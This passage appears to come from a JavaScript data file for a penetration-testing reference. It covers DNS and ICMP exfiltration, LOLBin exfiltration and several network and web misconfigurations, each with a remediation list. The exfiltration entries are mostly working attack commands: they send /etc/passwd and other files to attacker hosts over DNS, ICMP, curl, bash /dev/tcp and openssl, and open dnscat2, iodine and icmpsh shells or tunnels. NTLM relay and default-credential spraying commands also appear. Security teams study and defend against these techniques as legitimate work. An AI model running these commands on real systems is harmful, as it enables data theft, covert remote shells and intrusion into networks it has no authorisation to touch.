          { label: "Windows one-liner (exfil a file)", cmd: "$d=[Convert]::ToBase64String((gc secret.txt -Encoding byte)); nslookup \"$d.exfil.attacker.com\"" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Control an authoritative name server for a domain you own", cmd: "# delegate exfil.attacker.com to a server you run; every query for *.exfil.attacker.com\n# is delivered to you, carrying whatever data is in the labels" },
              { label: "2. Manual exfiltration — encode data into query names", cmd: "# base32 avoids case/charset issues in DNS labels\ncat /etc/passwd | base32 -w40 | while read chunk; do\n  nslookup \"$chunk.exfil.attacker.com\" >/dev/null\ndone\n# reassemble the chunks in the order queries arrive at your DNS server" },
              { label: "3. Interactive channel with dnscat2 (encrypted C2 over DNS)", cmd: "# attacker (authoritative server):\ndnscat2-server exfil.attacker.com\n# victim:\ndnscat2 exfil.attacker.com   # full shell/file transfer tunneled in DNS" },
              { label: "4. Full IP tunnel with iodine (route traffic over DNS)", cmd: "# attacker:\nsudo iodined -f -c -P secret 10.0.0.1 tunnel.attacker.com\n# victim:\nsudo iodine -f -P secret tunnel.attacker.com   # a tun interface over DNS" },
              { label: "5. Throttle to blend in", cmd: "# space queries out and keep names plausible; a flood of long random subdomains\n# to one domain is the classic detection signature" }
            ]
          },
          {
            title: "Why DNS Works for Exfil",
            type: "table",
            columns: ["Property", "Consequence"],
            rows: [
              ["Almost always allowed outbound", "Egress filtering rarely blocks DNS"],
              ["Goes via the internal resolver", "Reaches the internet even from segmented networks"],
              ["Rarely deep-inspected", "Payload in labels passes uninspected"],
              ["Recursive resolution", "The attacker's authoritative server receives the data"],
              ["Low and slow", "Small per-query capacity, but persistent"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Register a domain + run its name server", "A collection point for queries"],
              ["2", "Encode data into subdomain labels", "Exfil-ready query stream"],
              ["3", "Issue queries from the victim", "Data delivered to the attacker's NS"],
              ["4", "Reassemble / run dnscat2 tunnel", "Files exfiltrated / interactive C2"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["dnscat2", "Encrypted interactive C2 and file transfer over DNS"],
              ["iodine", "IP-over-DNS tunnel (full network tunnel)"],
              ["nslookup / dig / PowerShell", "Manual query-based exfiltration"],
              ["DNSExfiltrator", "Windows data exfiltration over DNS"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
              { label: "dnscat2", url: "https://github.com/iagox86/dnscat2" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Force all clients through controlled internal resolvers and block direct outbound DNS (UDP/TCP 53) from endpoints.",
              "Monitor DNS for anomalies: high query volume to one domain, long/high-entropy subdomains, and unusual record types (TXT/NULL).",
              "Deploy DNS security (RPZ, threat feeds) and consider DNS logging/inspection at the resolver.",
              "Egress-filter and segment so that even if DNS leaks, other channels are blocked.",
              "Detect: NXDOMAIN spikes, base32/hex-looking labels, and known tunneling tool signatures."
            ]
          }
        ]
      },
      {
        id: "covert-channel-exfil",
        name: "Covert Channel Tunneling (ICMP / Protocol Abuse)",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1048/",
        description: "Hide data and even interactive shells inside protocols firewalls usually permit — ICMP echo, fragmented IP, or a port already in use.",
        brief: "Beyond DNS, attackers tunnel data inside protocols that egress rules commonly allow. ICMP echo requests/replies (ping) carry arbitrary data payloads; IP fragmentation slips past stateless rules; and tools like tunnelshell open a covert TCP/UDP/ICMP channel that shows no listening process to <code>netstat</code>.\n\nImpact: on a network that blocks normal outbound connections, an attacker can still exfiltrate data and maintain an interactive shell over ICMP or fragmented traffic — channels defenders often forget to inspect.",
        quickReference: [
          { label: "ICMP tunnel (tunnelshell)", cmd: "victim: ./tunneld -t icmp -m echo-reply,echo\nattacker: ./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
          { label: "Fragmented-IP tunnel", cmd: "victim: ./tunneld -t frag\nattacker: ./tunnel -t frag 10.10.10.2" },
          { label: "ICMP data exfil (icmptunnel / hping3)", cmd: "hping3 -1 -E secret.txt -d 1400 attacker_ip" },
          { label: "Reverse shell over ICMP", cmd: "icmpsh / icmptunnel for interactive shell without opening a TCP port" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. ICMP covert channel — data rides inside ping payloads", cmd: "# tunnelshell: no listening port, invisible to netstat/ps grep on the wire\n# victim (server):\nsudo ./tunneld -t icmp -m echo-reply,echo\n# attacker (client) gets a shell over ICMP:\n./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
              { label: "2. Fragmented-IP channel — slip past stateless firewall rules", cmd: "# some firewalls pass fragments without the L4 header, permitting them despite rules\n# victim:\nsudo ./tunneld -t frag\n# attacker:\n./tunnel -t frag 10.10.10.2" },
              { label: "3. Quick ICMP file exfil with hping3", cmd: "# push file bytes into ICMP echo data\nhping3 -1 --icmp -E /etc/passwd -d 1400 attacker_ip\n# attacker captures and reassembles with tcpdump/wireshark on icmp" },
              { label: "4. Interactive reverse shell over ICMP (no TCP port)", cmd: "# attacker:\nsudo icmpsh -t <victim_ip> -d 500\n# victim:\nicmpsh.exe -t <attacker_ip>   # shell tunneled entirely in ICMP" },
              { label: "5. Verify stealth", cmd: "# on the victim, the channel shows no TCP/UDP listener:\nnetstat -ano | findstr LISTEN   # nothing for the tunnel\n# detection has to happen on the network, by inspecting ICMP/fragment payloads" }
            ]
          },
          {
            title: "Covert Channels",
            type: "table",
            columns: ["Channel", "How it hides"],
            rows: [
              ["ICMP echo", "Arbitrary data in the ping payload; often allowed outbound"],
              ["IP fragmentation", "Fragments without L4 headers bypass stateless rules"],
              ["HTTP/TCP (no handshake)", "tunnelshell TCP mode reuses a port, no 3-way handshake"],
              ["UDP/DNS", "See DNS Exfiltration"],
              ["No local socket", "tunnelshell shows no PID/port in netstat — host-side blind spot"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Identify an allowed protocol (ICMP/frag)", "A viable covert channel"],
              ["2", "Start the tunnel server on the victim", "Covert listener with no visible socket"],
              ["3", "Connect from outside", "Interactive shell / data channel"],
              ["4", "Exfiltrate data through it", "Data leaves via 'permitted' traffic"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["tunnelshell", "ICMP / frag / TCP / UDP covert channels, no local socket"],
              ["icmpsh / icmptunnel", "Interactive shell over ICMP"],
              ["hping3", "Craft ICMP packets with file data in the payload"],
              ["Wireshark / tcpdump", "Capture and reassemble the covert traffic (attacker side)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
              { label: "HackingArticles — Data exfiltration (covert channels)", url: "https://www.hackingarticles.in/data-exfiltration/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Egress-filter strictly: block or tightly limit outbound ICMP and enforce that only proxies reach the internet.",
              "Configure firewalls to reassemble/inspect fragments rather than passing headerless fragments.",
              "Inspect ICMP payload sizes and rates; normal ping is small and regular, tunnels are not.",
              "Force outbound traffic through inspecting proxies so raw TCP/UDP/ICMP cannot leave endpoints.",
              "Detect: oversized/asymmetric ICMP, high fragment volume, and known tunneling signatures."
            ]
          }
        ]
      },
      {
        id: "lolbin-exfil",
        name: "Exfiltration via Living-off-the-Land Binaries",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1567/",
        description: "Use trusted, pre-installed system binaries — curl, wget, certutil, bitsadmin, nc, openssl, even finger and whois — to move data out without dropping tooling.",
        brief: "Every OS ships binaries that can transfer data, and abusing them (LOLBins/GTFOBins) lets an attacker exfiltrate without installing anything that would look out of place. On Linux: curl/wget POST, nc, openssl, bash's /dev/tcp, and even whois/finger/busybox. On Windows: certutil, bitsadmin, PowerShell, and curl.\n\nImpact: because the binaries are signed/trusted and expected on the host, this exfiltration blends into normal activity and evades tooling that watches for unknown executables — a low-effort, high-stealth way to get stolen data off the box.",
        quickReference: [
          { label: "Linux — HTTP POST a file", cmd: "curl -X POST -d @/etc/passwd http://attacker\nwget --post-file=/etc/passwd http://attacker" },
          { label: "Linux — bash /dev/tcp (no tools)", cmd: "bash -c 'cat /etc/passwd > /dev/tcp/attacker/1234'" },
          { label: "Linux — TLS-wrapped exfil", cmd: "openssl s_client -quiet -connect attacker:1234 < /etc/passwd" },
          { label: "Windows — certutil / bitsadmin", cmd: "certutil -encode secret.txt s.b64 & certutil -urlcache -f http://attacker/up (post)\nbitsadmin /transfer j http://attacker/x C:\\x" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Linux HTTP exfil with curl/wget (listener catches the POST)", cmd: "# attacker:  nc -lvp 80\n# victim:\ncurl -X POST -d @/etc/passwd http://attacker_ip\nwget --post-file=/etc/passwd http://attacker_ip" },
              { label: "2. No transfer tool? bash's built-in /dev/tcp", cmd: "# attacker:  nc -lvp 1234\n# victim (bash only):\ncat /etc/passwd > /dev/tcp/attacker_ip/1234\n# or an HTTP-shaped one:\nbash -c 'echo -e \"POST / HTTP/1.0\\n\\n$(</etc/passwd)\" > /dev/tcp/attacker_ip/1234'" },
              { label: "3. Encrypt in transit with openssl (defeats plaintext IDS)", cmd: "# attacker: openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes\n#           openssl s_server -quiet -key k.pem -cert c.pem -port 1234 > loot\n# victim:\nopenssl s_client -quiet -connect attacker_ip:1234 < /etc/passwd" },
              { label: "4. Obscure LOLBins the same idea reaches", cmd: "# nc:      nc attacker_ip 5555 < secret.txt\n# whois:   whois -h attacker_ip -p 43 \"$(cat /etc/passwd)\"\n# finger:  finger \"$(cat /etc/passwd)@attacker_ip\"\n# host an HTTP server to pull instead: busybox httpd -f -p 8080 -h .  /  irb WEBrick" },
              { label: "5. Windows LOLBins", cmd: "certutil -encode C:\\loot.zip C:\\loot.b64   # then POST/upload the b64\nbitsadmin /transfer job /upload http://attacker/up C:\\loot.zip\npowershell -c \"Invoke-RestMethod -Uri http://attacker/up -Method Post -InFile C:\\loot.zip\"\ncurl.exe -X POST --data-binary @C:\\loot.zip http://attacker/up" }
            ]
          },
          {
            title: "Binary → Channel",
            type: "table",
            columns: ["Binary", "Exfil method"],
            rows: [
              ["curl / wget", "HTTP(S) POST / upload"],
              ["nc (netcat)", "Raw TCP transfer"],
              ["bash /dev/tcp", "Pure-shell TCP, no external tool"],
              ["openssl s_client", "TLS-encrypted TCP"],
              ["whois / finger", "Data smuggled into the query argument"],
              ["certutil / bitsadmin (Win)", "Encode + BITS/HTTP transfer"],
              ["busybox httpd / irb WEBrick", "Serve files for the attacker to pull"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Collect and stage the target data", "Loot ready to move"],
              ["2", "Pick a trusted binary already on the host", "No new tooling to flag"],
              ["3", "Transfer via HTTP/TCP/TLS to your listener", "Data leaves as normal-looking traffic"],
              ["4", "Optionally encode/encrypt", "Evades content inspection"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["curl / wget / nc / openssl / bash", "Linux LOLBin transfer channels"],
              ["certutil / bitsadmin / PowerShell / curl.exe", "Windows LOLBin transfer"],
              ["GTFOBins / LOLBAS", "Reference catalogues of abusable binaries"],
              ["netcat (attacker listener)", "Receive the exfiltrated data"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1567 — Exfiltration Over Web Service", url: "https://attack.mitre.org/techniques/T1567/" },
              { label: "GTFOBins", url: "https://gtfobins.github.io/" },
              { label: "LOLBAS (Windows)", url: "https://lolbas-project.github.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce egress filtering: endpoints should reach the internet only through inspecting proxies, not arbitrary hosts/ports.",
              "Apply application allow-listing and command-line logging so LOLBin misuse (certutil/bitsadmin encoding, /dev/tcp) is visible.",
              "Monitor for anomalous outbound connections from server processes and unusual use of transfer binaries.",
              "Use DLP to detect sensitive data leaving over HTTP/HTTPS, and restrict where servers can connect.",
              "Detect: certutil -encode/-urlcache, bitsadmin transfers, bash /dev/tcp, and curl/wget POSTing local files."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Misconfigurations",
    vulns: [
      {
        id: "smb-signing-disabled",
        name: "SMB Signing Not Required",
        severity: "High",
        ref: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Hosts that do not require SMB signing can be targeted by NTLM relay, turning a captured authentication into access.",
        brief: "SMB signing cryptographically signs SMB sessions so a man-in-the-middle cannot tamper with or relay them. When it is not required (the default on non-DC Windows for years), a host becomes a valid NTLM relay target: an attacker who coerces or poisons an authentication can forward it to that host and act as the victim — dumping the SAM or executing commands.\n\nIt is one of the most common and impactful internal misconfigurations, because it converts everyday name-resolution noise into lateral movement.",
        quickReference: [
          { label: "Find hosts without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
          { label: "Check a single host", cmd: "netexec smb 10.0.0.5   (look for signing:False)" },
          { label: "Exploit via relay", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i" },
          { label: "nmap", cmd: "nmap --script smb2-security-mode -p445 <host>" }
        ],
        sections: [
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["NetExec", "The SMB banner shows signing:True/False per host; --gen-relay-list collects the vulnerable ones"],
              ["nmap", "smb2-security-mode reports whether signing is required, enabled, or disabled"],
              ["Scope", "DCs require signing by default; member servers and workstations usually do not"],
              ["Pair with", "LLMNR/NBT-NS poisoning or coercion to generate the authentication to relay"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Lateral movement", "Relay a captured/coerced auth to the unsigned host and act as the victim"],
              ["Credential dumping", "Dump SAM/LSA secrets from the relayed-to host"],
              ["Command execution", "Run commands as the relayed identity"],
              ["Chain to domain", "Combine with coercion of a privileged account for a larger foothold"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing via Group Policy on all systems — 'Microsoft network server: Digitally sign communications (always)'.",
              "Also require signing on clients so they refuse unsigned sessions.",
              "Disable LLMNR and NBT-NS to remove the easiest way to obtain the authentication to relay.",
              "Enforce SMB signing and channel binding together as part of a relay-hardening baseline.",
              "Verify with a relay-list scan after rollout — the vulnerable-host list should be empty."
            ]
          }
        ]
      },
      {
        id: "null-session",
        name: "Anonymous / Null Sessions",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1087/",
        description: "Unauthenticated SMB/RPC or LDAP access leaks users, groups, shares, and the password policy.",
        brief: "A null (anonymous) session is unauthenticated access to a Windows host's SMB/RPC interfaces, historically allowing enumeration of users, groups, shares, and the password policy without any credential. Anonymous LDAP binds are the directory equivalent. Modern Windows locks most of this down, but legacy configurations, older hosts, and misconfigured services still expose it.\n\nThe information it leaks — usernames, the lockout policy, share names — is the groundwork for password spraying and further attacks.",
        quickReference: [
          { label: "Null SMB enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>" },
          { label: "NetExec null check", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol" },
          { label: "RID cycling", cmd: "enum4linux-ng -R <host>   (enumerate users via SID walking)" },
          { label: "Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\"" }
        ],
        sections: [
          {
            title: "What It Leaks",
            type: "table",
            columns: ["Data", "Use"],
            rows: [
              ["Usernames", "Build a spray/roast list"],
              ["Password policy", "Lockout threshold and window — the safe spray rate"],
              ["Shares", "Discover readable shares and their contents"],
              ["Groups", "Identify privileged group membership"],
              ["Domain SID", "Enables RID cycling to enumerate accounts when direct listing is blocked"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Try an empty credential", "'' / '' over SMB and RPC; a guest account may also be enabled"],
              ["Anonymous LDAP", "An unauthenticated bind that returns directory data"],
              ["RID cycling fallback", "Works via the domain SID when -U is blocked"],
              ["Modern reality", "Usually closed on current Windows — do not assume a host is hardened from one empty result"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Restrict anonymous access: set RestrictAnonymous / RestrictAnonymousSAM and 'Network access: Do not allow anonymous enumeration of SAM accounts and shares'.",
              "Disable anonymous LDAP binds on domain controllers.",
              "Disable the guest account and audit legacy hosts that still permit null sessions.",
              "Remove unnecessary shares and lock down share/NTFS permissions.",
              "Since usernames still leak by other means, pair this with a strong lockout policy and MFA."
            ]
          }
        ]
      },
      {
        id: "default-credentials",
        name: "Default Credentials",
        severity: "High",
        ref: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
        description: "Devices, panels, and services left on vendor-default or well-known credentials grant instant access.",
        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in. Admin panels, routers, printers, databases, management interfaces, and internal tools are the usual offenders.\n\nIt is unglamorous and extremely common, and it frequently provides the highest-privilege access on a network for zero effort.",
        quickReference: [
          { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat" },
          { label: "Product examples", cmd: "Jenkins, Grafana admin/admin; Tomcat manager; iDRAC/iLO; DB defaults" },
          { label: "Spray defaults across a service", cmd: "netexec <proto> <targets> -u users.txt -p defaults.txt --no-bruteforce" },
          { label: "References", cmd: "Vendor manuals, SecLists Passwords/Default-Credentials, DefaultCreds-cheat-sheet" }
        ],
        sections: [
          {
            title: "Where to Look",
            type: "table",
            columns: ["Target", "Common defaults"],
            rows: [
              ["Web admin panels", "admin/admin, admin/password, product-specific pairs"],
              ["App servers", "Tomcat manager (tomcat/tomcat), JBoss, WebLogic consoles"],
              ["Databases", "sa with blank password (MSSQL), root with no password (MySQL/Mongo)"],
              ["Management interfaces", "iDRAC/iLO/IPMI, switches, routers, printers, cameras"],
              ["Dev/monitoring tools", "Jenkins, Grafana, Kibana, RabbitMQ (guest/guest)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Fingerprint the product", "WhatWeb/Nuclei identifies the software so you know the default to try"],
              ["Consult the default list", "Vendor docs and default-credential databases"],
              ["Test carefully", "Try the top pairs; mind lockouts on real accounts"],
              ["Nuclei templates", "default-logins/ templates automate the check across many products"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Change every default credential before a system goes into service; make it a deployment checklist item.",
              "Enforce a strong-password policy and MFA on management and admin interfaces.",
              "Do not expose management interfaces to untrusted networks; segment and firewall them.",
              "Inventory devices and scan periodically with default-credential checks (Nuclei default-logins).",
              "Disable or remove unused default/sample accounts entirely."
            ]
          }
        ]
      },
      {
        id: "directory-listing",
        name: "Directory Listing Enabled",
        severity: "Low",
        ref: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing",
        description: "The web server auto-indexes folders without an index file, exposing files that were never meant to be browsable.",
        brief: "When a web server is configured to auto-generate a listing for directories that lack an index file, it reveals every file in that folder — including backups, source, config, uploads, and old versions that were never linked and were assumed hidden. It is low severity by itself, but it routinely exposes other findings: credentials in a stray config, a database dump, or source code.\n\nThe fix is simply to disable automatic indexing.",
        quickReference: [
          { label: "Spot it", cmd: "Page titled 'Index of /' with a file listing" },
          { label: "Dork for it", cmd: "site:target.com intitle:\"index of\"" },
          { label: "Probe common dirs", cmd: "/uploads/  /backup/  /files/  /.git/  /assets/  /tmp/" },
          { label: "Scan", cmd: "nuclei -tags exposure; or content discovery with ffuf/feroxbuster" }
        ],
        sections: [
          {
            title: "What It Exposes",
            type: "table",
            columns: ["Content", "Risk"],
            rows: [
              ["Backups", ".bak, .zip, .tar.gz of the site or database"],
              ["Source & config", "Code, .env, config files with secrets"],
              ["Uploads", "User files, sometimes other users' documents"],
              ["Old versions", "Deprecated pages/endpoints still reachable"],
              ["Internal notes", "READMEs, TODOs, and paths that inform further attacks"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Browse directories", "Request a folder path with no index file"],
              ["Search engines", "intitle:\"index of\" scoped to the domain"],
              ["Content discovery", "ffuf/feroxbuster reveal directories to check"],
              ["Scanners", "Nikto and Nuclei exposure templates flag indexing"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable automatic directory indexing (Options -Indexes in Apache; autoindex off in nginx; disable directory browsing in IIS).",
              "Do not store backups, source, or config anywhere under the web root.",
              "Add an index file or explicit deny rules to sensitive directories.",
              "Review what is web-accessible and remove stray files; treat any exposed secret as compromised.",
              "Scan periodically for indexing and exposed files as part of monitoring."
            ]
          }
        ]
      },
      {
        id: "exposed-source-backups",
        name: "Exposed .git / Source & Backups",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code",
        description: "A deployed .git folder, backup archive, or editor swap file lets an attacker reconstruct source and extract secrets.",
        brief: "Deploying a site with its version-control metadata or leaving backups under the web root exposes the application's source. A reachable /.git/ directory can be downloaded and the full repository — including history and secrets in old commits — reconstructed. Backup archives (.zip, .bak, .sql), editor swap/temp files, and .DS_Store listings do the same for source and data.\n\nSource disclosure hands an attacker the code to find further bugs and, very often, hardcoded credentials.",
        quickReference: [
          { label: "Detect exposed git", cmd: "curl -s https://target.com/.git/HEAD   (returns 'ref: refs/heads/...')" },
          { label: "Dump the repo", cmd: "git-dumper https://target.com/.git ./out   (then git log -p for secrets)" },
          { label: "Backup/temp files", cmd: "/backup.zip  /db.sql  /index.php.bak  /.env  /config.php~  /.DS_Store" },
          { label: "Other VCS/CI", cmd: "/.svn/  /.hg/  /.gitignore  /.git/config  exposed CI files" }
        ],
        sections: [
          {
            title: "Exposure Types",
            type: "table",
            columns: ["Artifact", "What it yields"],
            rows: [
              [".git directory", "Full source and history — reconstruct with git-dumper, then mine commits for secrets"],
              ["Backup archives", ".zip/.tar.gz/.bak/.sql of the app or database"],
              ["Editor artifacts", "vim .swp, file~ , .orig — recover source of a single file"],
              [".DS_Store", "Directory listings that reveal otherwise-unknown filenames"],
              ["Env/config", ".env, config.php, appsettings.json with credentials"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Probe /.git/HEAD", "A valid ref confirms an exposed repository"],
              ["Guess backup names", "Content discovery with common backup/temp extensions"],
              ["Scanners", "Nuclei exposure templates and Nikto flag these"],
              ["Mine history", "Once dumped, git log -p and secret scanners (trufflehog/gitleaks) find keys"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never deploy version-control metadata; exclude .git/.svn from the build/deploy artifact, and block them at the web server.",
              "Keep backups, dumps, and source archives outside the web root entirely.",
              "Configure the server to deny dotfiles and known backup/temp extensions.",
              "Rotate any secret that was ever committed — removing the file does not remove it from history.",
              "Add a CI check that fails if deployable artifacts contain VCS or backup files."
            ]
          }
        ]
      },
      {
        id: "secrets-exposure",
        name: "Exposed Secrets & API Keys",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials",
        description: "Credentials and API keys leaked in client-side code, repos, or responses grant direct access to backends.",
        brief: "Applications leak secrets in many places: hardcoded in front-end JavaScript, committed to public repositories, left in config files, or returned in API responses and error messages. A single leaked cloud key, database credential, or third-party token can give an attacker direct access to backend systems — bypassing the application entirely.\n\nThis is distinct from a code bug: the secret is simply exposed. Finding and rotating leaked secrets, and keeping them out of anything client-reachable, is the defence.",
        quickReference: [
          { label: "Mine front-end JS", cmd: "grep -oiE '(api[_-]?key|secret|token|password|bearer)[\"'\\'':= ]+[A-Za-z0-9_\\-]{16,}' app.js" },
          { label: "Public repos", cmd: "GitHub code search: \"target.com\" api_key ; org:target filename:.env" },
          { label: "Repo history scan", cmd: "trufflehog git file://./repo ; gitleaks detect -s ./repo" },
          { label: "Common locations", cmd: "JS bundles, /.env, config files, source maps (.js.map), API/error responses" }
        ],
        sections: [
          {
            title: "Where Secrets Leak",
            type: "table",
            columns: ["Location", "Detail"],
            rows: [
              ["Client-side JS", "Keys embedded in bundles/source maps, reachable by anyone"],
              ["Public code", "GitHub/GitLab repos and gists, especially old commits"],
              ["Config files", ".env, appsettings.json, web.config under the web root"],
              ["API/error responses", "Tokens or connection strings echoed in output"],
              ["Archives & history", "Wayback-archived JS and prior git commits"]
            ]
          },
          {
            title: "Impact by Secret Type",
            type: "table",
            columns: ["Secret", "Consequence"],
            rows: [
              ["Cloud keys (AWS/GCP/Azure)", "Direct access to cloud resources — often full account compromise"],
              ["Database credentials", "Read/write the database directly"],
              ["Third-party API tokens", "Abuse paid/privileged services, pivot to partner systems"],
              ["Signing secrets", "Forge JWTs/sessions (see JWT Vulnerabilities)"],
              ["Internal service creds", "Reach internal APIs and infrastructure"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Keep secrets server-side and out of anything the client receives; never ship an API key in front-end code — proxy the call instead.",
              "Use a secrets manager and inject secrets at runtime; never commit them to source control.",
              "Add pre-commit and CI secret scanning (gitleaks/trufflehog) to catch leaks before they ship.",
              "Rotate any exposed secret immediately and treat it as compromised, including in git history and archives.",
              "Scope keys tightly (least privilege, IP/referrer restrictions) so a leak is contained."
            ]
          }
        ]
      },
      {
        id: "verbose-errors",
        name: "Verbose Errors & Info Disclosure",
        severity: "Low",
        ref: "https://owasp.org/www-community/Improper_Error_Handling",
        description: "Stack traces and debug output reveal versions, paths, queries, and internals that aid further attacks.",
        brief: "When an application returns detailed error output — stack traces, SQL queries, file paths, framework versions, debug pages — it hands an attacker a map of its internals. On its own each leak is minor, but together they accelerate every other attack: confirming an injection, revealing the tech stack for targeted CVEs, and exposing internal hostnames and paths.\n\nProduction systems should show generic errors to users and log the detail server-side.",
        quickReference: [
          { label: "Trigger errors", cmd: "Send malformed input, wrong types, a stray ', or a bad path" },
          { label: "Debug-mode tells", cmd: "Django/Flask debug page, ASP.NET yellow screen, Rails error, Whoops (PHP)" },
          { label: "What to harvest", cmd: "Framework + versions, file paths, SQL fragments, internal hostnames, stack frames" },
          { label: "Config leaks", cmd: "Debug endpoints, /server-status, verbose 500s, X-Powered-By headers" }
        ],
        sections: [
          {
            title: "What Gets Leaked",
            type: "table",
            columns: ["Leak", "Use to an attacker"],
            rows: [
              ["Stack traces", "Framework, versions, and code paths for targeted exploitation"],
              ["SQL in errors", "Confirms injection and reveals query structure"],
              ["File paths", "Absolute paths aid LFI/traversal and reveal the OS/layout"],
              ["Version banners", "Map to known CVEs (X-Powered-By, Server headers, generator tags)"],
              ["Debug consoles", "Some debug pages allow code execution (e.g. Werkzeug console)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Force errors", "Bad input, wrong methods, non-existent paths"],
              ["Check headers", "X-Powered-By, Server, and framework-specific headers"],
              ["Look for debug mode", "Framework debug pages left enabled in production"],
              ["Scanners", "Nikto/Nuclei flag verbose errors and info-disclosure headers"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable debug mode in production and return generic error pages to users; log the detail server-side only.",
              "Strip version-revealing headers (X-Powered-By, detailed Server) and framework banners.",
              "Handle exceptions centrally so no raw stack trace ever reaches the client.",
              "Remove or protect debug endpoints, consoles, and status pages (e.g. /server-status).",
              "Review error responses across the app, including APIs, not just the main pages."
            ]
          }
        ]
      },
      {
        id: "missing-security-headers",
        name: "Missing Security Headers",
        severity: "Low",
        ref: "https://owasp.org/www-project-secure-headers/",
        description: "Absent HTTP security headers remove browser-side defenses against XSS, clickjacking, and downgrade.",
        brief: "Modern browsers enforce a set of protections that the server must opt into via response headers. When they are missing, the browser's defense-in-depth against XSS, clickjacking, MIME sniffing, and protocol downgrade is simply not active. No single missing header is critical, but their absence weakens the whole client-side security posture and often accompanies other issues.\n\nSetting them is cheap and high-value hardening.",
        quickReference: [
          { label: "Check headers", cmd: "curl -sI https://target.com   (inspect the response headers)" },
          { label: "The important ones", cmd: "Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options / frame-ancestors" },
          { label: "Scan", cmd: "nuclei -tags misconfig,headers ; or a headers-focused checker" },
          { label: "Cookie flags too", cmd: "Set-Cookie: Secure; HttpOnly; SameSite" }
        ],
        sections: [
          {
            title: "Key Headers",
            type: "table",
            columns: ["Header", "Protects against"],
            rows: [
              ["Content-Security-Policy", "XSS and data injection — the highest-value header when done well"],
              ["Strict-Transport-Security (HSTS)", "Protocol downgrade and SSL-strip"],
              ["X-Content-Type-Options: nosniff", "MIME sniffing that turns uploads into script"],
              ["X-Frame-Options / frame-ancestors", "Clickjacking (framing)"],
              ["Referrer-Policy", "Leaking URLs/tokens via the Referer header"],
              ["Permissions-Policy", "Unwanted access to browser features (camera, geolocation)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Inspect responses", "curl -I or the browser dev-tools network tab"],
              ["Check every response type", "HTML, API, and error responses may differ"],
              ["Cookie attributes", "Verify Secure, HttpOnly, and SameSite on session cookies"],
              ["Automated", "Nuclei and dedicated header scanners grade the set"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
